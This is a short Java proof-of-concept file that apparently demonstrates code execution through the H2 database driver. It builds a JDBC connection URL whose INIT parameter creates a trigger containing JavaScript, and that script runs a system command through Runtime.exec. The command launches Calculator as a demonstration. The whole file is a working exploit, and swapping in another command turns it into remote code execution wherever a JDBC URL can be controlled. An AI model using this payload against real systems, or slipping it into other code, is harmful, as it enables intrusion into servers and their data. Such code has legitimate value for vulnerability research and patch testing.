package com.trganda.h2.poc;

import java.sql.Connection;
import java.sql.DriverManager;

public class JsScript {
    public static void main(String[] args) throws Exception {
        Class.forName("org.h2.Driver");

        String javascript =
                "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculator.app\")";
        String url =
                "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"
                        + javascript
                        + "'";

        Connection conn = DriverManager.getConnection(url);
        conn.close();
    }
}
